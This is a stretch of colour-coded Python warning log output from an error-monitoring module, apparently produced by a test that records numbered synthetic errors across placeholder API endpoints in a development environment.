WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.951342Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4898'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.951390Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4899'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.951438Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4900'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.951534Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4901'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.951609Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4902'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.951665Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4903'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.951715Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4904'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.951764Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4905'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.951813Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4906'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.951863Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4907'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.951948Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4908'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.952021Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4909'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.952075Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4910'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.952126Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4911'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.952176Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4912'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.952227Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4913'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.952276Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4914'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.952325Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4915'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.952374Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4916'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.952422Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4917'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.952469Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4918'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.952518Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4919'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.952565Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4920'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.952615Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4921'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.952665Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4922'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.952714Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4923'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.952763Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4924'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.952811Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4925'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.952860Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4926'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.952907Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4927'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.952955Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4928'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.953003Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4929'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.953051Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4930'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.953098Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4931'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.953145Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4932'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.953193Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4933'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.953240Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4934'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.953288Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4935'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.953389Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4936'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.953459Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m99[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4937'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
